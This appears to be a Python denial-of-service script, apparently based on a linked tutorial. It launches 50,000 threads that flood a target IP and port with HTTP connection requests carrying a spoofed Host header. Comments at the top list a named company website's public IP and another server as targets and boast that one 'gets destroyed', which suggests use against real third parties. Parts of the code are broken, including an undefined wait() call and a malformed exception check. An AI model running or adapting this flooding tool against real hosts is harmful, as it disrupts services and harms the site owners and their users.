# https://www.neuralnine.com/code-a-ddos-script-in-python/
# 10.1.1.202:80 - OPTIBATCH Server(Quite resiliant, seems to bounce back easily)
# 49.50.246.83:80 - www.supacrete.co.nz(Gets fucking destroyed)

import socket
import threading

target = input("Enter target ip: ")
fake_ip = "125.47.192.66"
port = int(input("Enter target port: "))

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global attack_num
        attack_num += 1
        print("attack block re-executed:", attack_num )
        s.close()
        
for i in range(50000):
    thread = threading.Thread(target=attack)
    thread.start()
    if(thread.is_alive):
        print("sending packets.")
        wait(0.3)
        print("sending packets..")
        wait(0.3)
        print("sending packets...")
    elif OSError or Exception in thread:
        thread.start()
    else:
        thread.start()